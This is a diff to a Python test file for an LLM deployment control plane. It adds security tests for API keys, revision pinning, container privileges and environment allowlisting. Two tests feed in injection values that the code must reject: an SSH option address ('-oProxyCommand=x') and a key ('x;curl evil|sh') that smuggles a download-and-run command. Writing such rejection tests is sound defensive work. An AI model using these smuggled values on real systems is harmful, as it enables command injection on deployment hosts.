@@ -143,7 +143,8 @@ class FakeAdapter(SparkrunAdapter):
     def launch(
         self, plan, shape, runtime, ctx, max_seqs, *, served_name=None, port=None,
         gpu_memory_utilization=None, kv_cache_memory_bytes=None, on_output=None,
-        extra_args=(), custom_command=(),
+        extra_args=(), custom_command=(), runtime_api_key=None, revision=None,
+        speculative_tokens=0,
     ):
         if self.fail_with is not None:
             raise self.fail_with
@@ -168,7 +169,8 @@ class FakeAdapter(SparkrunAdapter):
             # reason the share above is: a fake that dropped the KV budget
             # would let the manager pass a number nothing ever checks.
             kv_cache_memory_bytes=kv_cache_memory_bytes, extra_args=extra_args,
-            custom_command=custom_command,
+            custom_command=custom_command, runtime_api_key=runtime_api_key,
+            revision=revision, speculative_tokens=speculative_tokens,
         )
         self.recipes.append(recipe.content)
         materialize(recipe)
@@ -244,7 +246,7 @@ class FakeProbe:
         self.overrides: dict[str, bool] = {}
         self.calls = 0
 
-    def __call__(self, backend_url: str, timeout: float = 3.0, expect_model=None):
+    def __call__(self, backend_url: str, timeout: float = 3.0, expect_model=None, api_key=None):
         self.calls += 1
         healthy = self.overrides.get(backend_url, self.healthy_by_default)
         return (True, None) if healthy else (False, "%s unreachable" % backend_url)
@@ -416,6 +418,26 @@ def test_render_command_sends_expert_parallel_when_planned(tmp_path):
     assert "--enable-expert-parallel" in recipe.content
 
 
+def test_hosts_for_refuses_an_address_ssh_would_read_as_an_option(tmp_path):
+    rogue = dataclasses.replace(fx.SPARK_02, address="-oProxyCommand=x")
+    adapter = FakeAdapter(FakeRegistry(fx.SPARK_01, rogue), recipe_dir=tmp_path / "r")
+    with pytest.raises(ValueError, match="no usable address"):
+        adapter.hosts_for(["spark-01", "spark-02"])
+
+
+def test_a_launch_onto_an_unusable_address_fails_with_the_refusal_verbatim(tmp_path):
+    rogue = dataclasses.replace(fx.SPARK_02, address="-oProxyCommand=x")
+    manager = make_manager(tmp_path, registry=FakeRegistry(fx.SPARK_01, rogue))
+    dep = manager.launch(fx.LLAMA_3_3_70B, fx.pp2_plan(), fx.fits_degraded(), "vllm", 8192, 16)
+    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.FAILED)
+    assert (
+        "node spark-02 has no usable address ('-oProxyCommand=x'); refusing to launch"
+        in manager.get(dep.deployment_id).last_error
+    )
+    assert manager.adapter.launches == []
+    manager.close()
+
+
 def test_unknown_node_id_falls_back_to_the_id_itself(tmp_path):
     """Node ids are hostnames in practice. An unknown one is used verbatim
     rather than blocking a launch on a registry that has not caught up."""
@@ -509,8 +531,9 @@ def test_the_tts_recipe_runs_derates_own_server_and_templates_every_knob(tmp_pat
         assert "{%s}" % key in body, "recipe command drops %s" % key
         assert "\n  %s:" % key in body, "recipe defaults omit %s" % key
     # The remote code is the model: these checkpoints ship their own
-    # architecture, and without this flag transformers refuses to load them.
-    assert "--trust-remote-code" in body
+    # architecture. Still opt-in (R2): the flag is the deployment's field,
+    # never part of the template.
+    assert "--trust-remote-code" not in body
     assert "runtime: vllm" in body
     assert "min_nodes: 1" in body
 
@@ -817,7 +840,7 @@ def test_path_shaped_command_unsafe_strings_are_still_rejected(tmp_path, model_i
         ("--quantization", "modelopt_fp4"),
         ("--kv-cache-dtype=fp8",),
         ("-tp", "2"),
-        ("--trust-remote-code",),
+        ("--enforce-eager",),
         ("--lora-modules", "/cache/huggingface/derate-runtime-cache/lora"),
     ],
 )
@@ -1256,7 +1279,7 @@ def test_hanging_health_endpoint_still_fails_within_fifteen_seconds(tmp_path):
 
     hanging = {"on": False}
 
-    def probe_fn(backend_url, timeout=3.0, expect_model=None):
+    def probe_fn(backend_url, timeout=3.0, expect_model=None, api_key=None):
         if not hanging["on"]:
             return True, None
         # Real socket connect + read against the hanging server above,
@@ -1309,7 +1332,7 @@ def test_hanging_health_endpoints_still_fail_within_fifteen_seconds_at_scale(tmp
 
     hanging = {"on": False}
 
-    def probe_fn(backend_url, timeout=3.0, expect_model=None):
+    def probe_fn(backend_url, timeout=3.0, expect_model=None, api_key=None):
         if not hanging["on"]:
             return True, None
         return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)
@@ -2305,7 +2328,7 @@ def test_a_backend_serving_another_model_is_not_adopted_as_ours(tmp_path):
     process serving `ling-3.0-flash`. Routing then sent it real traffic: a
     request for one model was answered, with no error anywhere, by another.
     """
-    def stranger(backend_url, timeout=3.0, expect_model=None):
+    def stranger(backend_url, timeout=3.0, expect_model=None, api_key=None):
         # Liveness alone still says yes, which is exactly the trap: the old
         # probe asked only this question and got the answer it wanted.
         if not expect_model:
@@ -2339,7 +2362,7 @@ def test_reconcile_retires_a_record_whose_port_holds_a_stranger(tmp_path):
     assert wait_for(lambda: first.get(d.deployment_id).state is S.READY)
     first.close()
 
-    def stranger(backend_url, timeout=3.0, expect_model=None):
+    def stranger(backend_url, timeout=3.0, expect_model=None, api_key=None):
         return False, (
             "%s/v1/models is serving ling-3.0-flash, not %s -- something else "
             "is already on this port." % (backend_url, expect_model)
@@ -2524,7 +2547,11 @@ def test_the_rendered_command_is_accepted_by_real_sparkrun(tmp_path):
     adapter = SparkrunAdapter(
         FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
     )
-    recipe = adapter.recipe_for(fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512)
+    sha = "0123456789abcdef0123456789abcdef01234567"
+    recipe = adapter.recipe_for(
+        fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512,
+        runtime_api_key="f" * 64, revision=sha,
+    )
     materialize(recipe)
     argv = adapter.render_command(
         fx.pp2_plan(), fx.GPT_OSS_120B, "vllm", 65536, 512, recipe=recipe
@@ -2541,6 +2568,10 @@ def test_the_rendered_command_is_accepted_by_real_sparkrun(tmp_path):
     assert "--max-num-seqs 512" in output
     assert "--served-model-name gpt-oss-120b" in output
     assert "--port 8100" in output
+    # M7: the approved commit, for the weights, the remote code and the
+    # tokenizer alike.
+    assert "--revision %s --code-revision %s" % (sha, sha) in output
+    assert "--tokenizer-revision %s" % sha in output
     # And the handle we track it by is parseable out of the output.
     from control_plane.deploy.sparkrun import CLUSTER_ID_RE, HEAD_HOST_RE
 
@@ -2563,7 +2594,11 @@ def test_synthesized_recipes_validate_for_every_runtime(tmp_path):
         # ever be launched with (deploy/flags.py::sharding_refusal).
         plan = fx.single_node_plan() if runtime == "tts" else fx.pp2_plan()
         shape = fx.AUDIO8_TTS_0_6B if runtime == "tts" else fx.GPT_OSS_120B
-        recipe = adapter.recipe_for(plan, shape, runtime, 32768, 256)
+        recipe = adapter.recipe_for(
+            plan, shape, runtime, 32768, 256,
+            runtime_api_key="f" * 64, revision="0123456789abcdef0123456789abcdef01234567",
+        )
+        assert "executor_config:" in recipe.content
         path = materialize(recipe)
         proc = subprocess.run(
             ["sparkrun", "recipe", "validate", str(path)],
@@ -3410,7 +3445,7 @@ def test_concurrently_hanging_probes_share_one_absolute_deadline(tmp_path):
     not eight: a serial per-thread join would accumulate k * deadline."""
     import time as _time
 
-    def hanging_probe(backend_url, timeout=3.0, expect_model=None):
+    def hanging_probe(backend_url, timeout=3.0, expect_model=None, api_key=None):
         _time.sleep(12)
         return True, None
 
@@ -3548,6 +3583,35 @@ def test_manual_degrees_reach_both_the_recipe_and_the_command_line(tmp_path):
 # answers, which on a first launch is twenty minutes of one unchanging word
 # covering four different slow things. These are the rules that make it four.
 # ==========================================================================
+
+
+def test_a_launch_failure_is_explained_from_a_literal_marker():
+    from control_plane.deploy import progress
+
+    assert progress.explain_failure(
+        "docker: error during connect: Post http: dial unix /var/run/docker.sock: "
+        "connect: no such file or directory."
+    ) == progress.DOCKER_UNREACHABLE
+    assert progress.explain_failure(
+        "Error: Failed to pull or locate image: x\nmanifest unknown"
+    ) == progress.IMAGE_MISSING
+    assert progress.explain_failure("EngineCore failed to start.") is None
+
+
+def test_preflight_refuses_only_a_container_with_no_docker_socket(tmp_path, monkeypatch):
+    from control_plane.deploy import progress, sparkrun
+
+    dockerenv = tmp_path / ".dockerenv"
+    dockerenv.write_text("")
+    sock = tmp_path / "docker.sock"
+    monkeypatch.setattr(sparkrun, "_DOCKERENV", dockerenv)
+    monkeypatch.setattr(sparkrun, "_DOCKER_SOCK", sock)
+    adapter = sparkrun.SparkrunAdapter(recipe_dir=tmp_path / "recipes")
+    with pytest.raises(sparkrun.DockerUnreachable) as err:
+        adapter.preflight()
+    assert str(err.value) == progress.DOCKER_UNREACHABLE
+    sock.write_text("")
+    assert adapter.preflight() is None
 
 
 def test_the_launcher_and_the_runtime_are_read_for_their_own_phases():
@@ -3973,8 +4037,11 @@ def test_the_manager_stops_waiting_when_the_runtime_says_it_died(tmp_path):
     failure = manager.get(dep.deployment_id).last_error
     assert "EngineCore failed to start." in failure
     # And the memory refusal underneath it reached the calibration event,
-    # which is the whole reason a fit miss is worth catching.
-    assert drain(manager.bus, ev.FIT_MISS), "a startup memory refusal is a fit miss"
+    # which is the whole reason a fit miss is worth catching. The post-mortem
+    # runs after the FAILED transition by design, so wait for it.
+    assert wait_for(lambda: drain(manager.bus, ev.FIT_MISS), timeout=10.0), (
+        "a startup memory refusal is a fit miss"
+    )
     manager.close()
 
 
@@ -4325,3 +4392,261 @@ def test_a_serving_deployment_reads_its_log_live_rather_than_replaying_it(tmp_pa
     assert answer["source"] == "read"
     assert any("only exists now" in line for line in answer["lines"])
     manager.close()
+
+
+# ==========================================================================
+# Security: the runtime key (H3), the revision pin (M7), the container's
+# privilege and per-model compile cache (M8), sparkrun's environment (L18).
+# ==========================================================================
+
+_SHA = "0123456789abcdef0123456789abcdef01234567"
+
+
+def _recipe(tmp_path, runtime="vllm", **kw):
+    shape = fx.AUDIO8_TTS_0_6B if runtime == "tts" else fx.GPT_OSS_120B
+    plan = fx.single_node_plan()
+    return recipes.synthesize(
+        shape, plan, runtime, 4096, 8, "m",
+        port=8100, gpu_memory_utilization=0.5, recipe_dir=tmp_path / "recipes", **kw,
+    )
+
+
+@pytest.mark.parametrize(
+    "runtime, env_name, flag",
+    [("vllm", "VLLM_API_KEY", None), ("sglang", "SGLANG_API_KEY", "--api-key {api_key}"),
+     ("tts", "DERATE_TTS_API_KEY", None)],
+)
+def test_the_recipe_carries_the_runtime_key_and_is_written_0600(tmp_path, runtime, env_name, flag):
+    key = "ab" * 32
+    recipe = _recipe(tmp_path, runtime, runtime_api_key=key)
+    assert '  %s: "%s"\n' % (env_name, key) in recipe.content
+    if flag:
+        assert flag in recipe.content
+        assert '  api_key: "%s"\n' % key in recipe.content
+    path = materialize(recipe)
+    assert path.stat().st_mode & 0o777 == 0o600
+
+
+def test_without_a_key_the_recipe_names_none(tmp_path):
+    content = _recipe(tmp_path, "sglang").content
+    assert "API_KEY" not in content and "--api-key" not in content
+
+
+def test_a_key_that_is_not_command_safe_is_refused(tmp_path):
+    with pytest.raises(ValueError):
+        _recipe(tmp_path, runtime_api_key="x;curl evil|sh")
+
+
+def test_the_revision_is_pinned_for_a_sha_and_omitted_otherwise(tmp_path):
+    pinned = _recipe(tmp_path, revision=_SHA).content
+    assert "--revision {revision} --code-revision {revision} --tokenizer-revision {revision}" in pinned
+    assert '  revision: "%s"\n' % _SHA in pinned
+    for unpinned in (None, "main", "local", _SHA[:12]):
+        content = _recipe(tmp_path, revision=unpinned).content
+        assert "--revision" not in content and "revision:" not in content
+    assert "--revision {revision}" in _recipe(tmp_path, "sglang", revision=_SHA).content
+    assert "--revision {revision}" in _recipe(tmp_path, "tts", revision=_SHA).content
+
+
+def test_containers_are_unprivileged(tmp_path):
+    content = _recipe(tmp_path).content
+    assert "executor_config:\n  privileged: false\n  cap_add: [IPC_LOCK]\n" in content
+
+
+def test_the_compile_cache_is_one_per_model():
+    from control_plane.deploy.flags import cache_env_for, runtime_spec
+
+    for runtime in ("vllm", "sglang"):
+        spec = runtime_spec(runtime)
+        a = dict(cache_env_for(spec, "org/model-a"))
+        b = dict(cache_env_for(spec, "org/model-b"))
+        assert a.keys() == b.keys()
+        assert all(a[k] != b[k] for k in a)
+    # The voice library is read-only and shared on purpose.
+    tts = runtime_spec("tts")
+    assert cache_env_for(tts, "a/b") == cache_env_for(tts, "c/d") == tts.cache_env
+
+
+def test_the_manager_mints_a_key_the_payload_never_shows(tmp_path):
+    from control_plane.gateway.serialize import deployment_payload
+
+    manager = make_manager(tmp_path)
+    deployment = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm", 4096, 8, revision=_SHA,
+    )
+    key = manager.runtime_api_key(deployment.deployment_id)
+    assert key and len(key) == 64
+    assert wait_for(lambda: manager.adapter.recipes)
+    assert 'VLLM_API_KEY: "%s"' % key in manager.adapter.recipes[-1]
+    assert deployment.revision == _SHA
+    assert key not in json.dumps(deployment_payload(deployment))
+    assert key not in repr(deployment)
+    # Two deployments, two keys.
+    other = manager.launch(
+        fx.AUDIO8_TTS_0_6B, fx.single_node_plan(), fx.fits(), "tts", 4096, 8,
+    )
+    assert manager.runtime_api_key(other.deployment_id) not in (None, key)
+    manager.close()
+
+
+def test_a_non_sha_revision_is_not_recorded_as_a_pin(tmp_path):
+    manager = make_manager(tmp_path)
+    deployment = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm", 4096, 8, revision="main",
+    )
+    assert deployment.revision is None
+    manager.close()
+
+
+def test_the_key_and_revision_survive_a_restart(tmp_path):
+    manager = make_manager(tmp_path)
+    deployment = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm", 4096, 8, revision=_SHA,
+    )
+    key = manager.runtime_api_key(deployment.deployment_id)
+    assert wait_for(lambda: manager.get(deployment.deployment_id).backend_url)
+    manager.close()
+    again = make_manager(tmp_path)
+    again.reconcile()
+    assert wait_for(lambda: again.get(deployment.deployment_id) is not None)
+    assert again.runtime_api_key(deployment.deployment_id) == key
+    assert again.get(deployment.deployment_id).revision == _SHA
+    again.close()
+
+
+def test_launch_output_never_keeps_the_key(tmp_path):
+    from control_plane.deploy.manager import _scrub_key
+
+    class R:
+        handle = {"runtime_api_key": "cd" * 32}
+
+    line = "docker run -e VLLM_API_KEY=%s img" % ("cd" * 32)
+    assert "cd" * 32 not in _scrub_key(R(), line)
+
+
+def test_sparkrun_inherits_only_allowlisted_environment(monkeypatch):
+    from control_plane.deploy.sparkrun import sparkrun_env
+
+    environ = {
+        "PATH": "/usr/bin", "HOME": "/home/x", "SSH_AUTH_SOCK": "/tmp/a",
+        "HF_TOKEN": "hf", "DERATE_VLLM_IMAGE": "img", "SPARKRUN_ADVANCED": "1",
+        "DERATE_TOKEN": "cluster", "DERATE_SECRET_OPENAI": "sk", "OPENAI_API_KEY": "sk2",
+        "AWS_SECRET_ACCESS_KEY": "a",
+    }
+    assert sparkrun_env(environ) == {
+        "PATH": "/usr/bin", "HOME": "/home/x", "SSH_AUTH_SOCK": "/tmp/a",
+        "HF_TOKEN": "hf", "DERATE_VLLM_IMAGE": "img", "SPARKRUN_ADVANCED": "1",
+    }
+    seen = {}
+
+    def fake_run(argv, **kw):
+        seen.update(kw["env"])
+        return subprocess.CompletedProcess(argv, 0, "sparkrun, version 0.2.40", "")
+
+    monkeypatch.setattr(os, "environ", dict(environ))
+    monkeypatch.setattr(subprocess, "run", fake_run)
+    monkeypatch.setattr(shutil, "which", lambda name: "/bin/sparkrun")
+    SparkrunAdapter().version()
+    assert "DERATE_TOKEN" not in seen and "DERATE_SECRET_OPENAI" not in seen
+    assert seen["PATH"] == "/usr/bin"
+
+
+def test_speculative_tokens_add_the_vllm_flag_and_metadata(tmp_path):
+    content = _recipe(tmp_path, speculative_tokens=2).content
+    assert (
+        "--speculative-config '{\"method\": \"mtp\", \"num_speculative_tokens\": 2}'"
+        in content
+    )
+    assert "  derate_speculative_tokens: 2\n" in content
+    # After the KV argument, before caller tokens.
+    with_args = _recipe(
+        tmp_path, speculative_tokens=2, extra_args=("--enforce-eager",)
+    ).content
+    assert with_args.index("--speculative-config") < with_args.rindex("--enforce-eager")
+    off = _recipe(tmp_path).content
+    assert "--speculative-config" not in off
+    assert "derate_speculative_tokens" not in off
+
+
+@pytest.mark.parametrize("bad", [9, -1, "x", True])
+def test_the_manager_refuses_speculative_tokens_out_of_range(tmp_path, bad):
+    manager = make_manager(tmp_path)
+    with pytest.raises(ValueError, match="speculative_tokens must be a whole number from 0 to 8."):
+        manager.launch(
+            fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm", 4096, 8,
+            speculative_tokens=bad,
+        )
+    assert manager.list() == []
+    manager.close()
+
+
+def test_the_manager_refuses_speculative_decoding_off_vllm(tmp_path):
+    manager = make_manager(tmp_path)
+    with pytest.raises(ValueError, match="only supported on the vllm runtime here"):
+        manager.launch(
+            fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "sglang", 4096, 8,
+            speculative_tokens=2,
+        )
+    manager.close()
+
+
+def test_speculative_tokens_reach_the_recipe_and_survive_the_store(tmp_path):
+    from control_plane.deploy.store import decode, encode
+
+    manager = make_manager(tmp_path)
+    deployment = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan(), fx.fits(), "vllm", 4096, 8,
+        speculative_tokens=3,
+    )
+    assert wait_for(lambda: manager.adapter.recipes)
+    assert '"num_speculative_tokens": 3' in manager.adapter.recipes[-1]
+    raw = encode(deployment)
+    assert decode(raw).speculative_tokens == 3
+    raw.pop("speculative_tokens")
+    assert decode(raw).speculative_tokens == 0
+    manager.close()
+
+
+def test_post_mortem_and_read_tail_scrub_the_runtime_key(tmp_path):
+    """R-2: a runtime that prints its own key must not hand it to the reader."""
+    probe = FakeProbe()
+    manager = make_manager(tmp_path, probe=probe, poll_interval_s=0.01)
+    dep = manager.launch(
+        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
+    )
+    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.READY)
+    key = manager.runtime_api_key(dep.deployment_id)
+    assert key
+    manager.adapter.log_tail = "server_args=ServerArgs(api_key='%s')" % key
+    answer = manager.log_tail(dep.deployment_id)
+    assert answer["source"] == "read", answer
+    assert answer["lines"] and not any(key in ln for ln in answer["lines"])
+    record = manager._records[dep.deployment_id]
+    manager._post_mortem(record)
+    assert "ServerArgs" in (record.deployment.last_error or "")
+    assert key not in record.deployment.last_error
+
+
+def test_shard_progress_regex_is_linear_on_a_hostile_line():
+    """R-4: a long digit run must not stall the coordinator's loop."""
+    import time as _time
+
+    from control_plane.deploy.progress import from_runtime_log
+
+    started = _time.perf_counter()
+    from_runtime_log("Loading safetensors checkpoint shards " + "1" * 50_000)
+    assert _time.perf_counter() - started < 0.1
+
+
+def test_remote_code_launch_withholds_the_hub_token_for_an_ungated_repo():
+    """R-6: opted-in remote code does not get HF_TOKEN unless the repo needs it."""
+    from control_plane.deploy.sparkrun import sparkrun_env
+
+    environ = {"PATH": "/usr/bin", "HF_TOKEN": "hf", "HUGGING_FACE_HUB_TOKEN": "hf2"}
+    assert sparkrun_env(environ, hub_token=False) == {"PATH": "/usr/bin"}
+    adapter = SparkrunAdapter(env=dict(environ), gated_probe=lambda model_id: False)
+    env = adapter._launch_env("org/remote", trust_remote_code=True)
+    assert "HF_TOKEN" not in env and "HUGGING_FACE_HUB_TOKEN" not in env
+    gated = SparkrunAdapter(env=dict(environ), gated_probe=lambda model_id: True)
+    assert gated._launch_env("org/remote", trust_remote_code=True)["HF_TOKEN"] == "hf"
+    assert adapter._launch_env("org/remote", trust_remote_code=False)["HF_TOKEN"] == "hf"
